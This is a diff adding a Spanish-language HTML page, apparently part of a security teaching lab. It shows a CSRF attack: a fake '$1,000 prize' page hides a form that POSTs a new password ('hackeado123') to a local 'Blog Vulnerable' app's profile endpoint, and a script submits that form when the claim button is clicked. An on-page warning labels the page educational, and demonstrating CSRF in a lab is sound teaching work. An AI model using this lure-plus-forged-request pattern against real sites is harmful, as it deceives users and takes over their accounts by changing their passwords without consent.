@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>¡Ganaste un Premio!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f9fa;
+            text-align: center;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #ff5722;
+        }
+        .prize {
+            font-size: 24px;
+            font-weight: bold;
+            color: #4caf50;
+            margin: 20px 0;
+        }
+        .button {
+            background-color: #4caf50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 10px 2px;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+        .warning {
+            margin-top: 30px;
+            padding: 10px;
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>¡Felicidades! ¡Has Ganado!</h1>
+        <div class="prize">$1,000.00 USD</div>
+        <p>Has sido seleccionado como ganador de nuestro sorteo mensual.</p>
+        <p>Haz clic en el botón a continuación para reclamar tu premio:</p>
+        
+        <button class="button" id="claim-button">Reclamar Premio Ahora</button>
+        
+        <!-- Formulario CSRF oculto que cambia la contraseña del usuario -->
+        <form id="csrf-form" action="http://localhost:5000/profile" method="POST" style="display:none;">
+            <input type="hidden" name="new_password" value="hackeado123">
+        </form>
+        
+        <div class="warning">
+            <strong>⚠️ Advertencia Educativa:</strong> Esta página demuestra un ataque CSRF (Cross-Site Request Forgery).
+            <p>Si presionas el botón mientras estás logueado en el Blog Vulnerable, tu contraseña será cambiada a "hackeado123".</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('claim-button').addEventListener('click', function() {
+            document.getElementById('csrf-form').submit();
+            alert('¡Gracias! Procesando tu premio...');
+        });
+    </script>
+</body>
+</html>
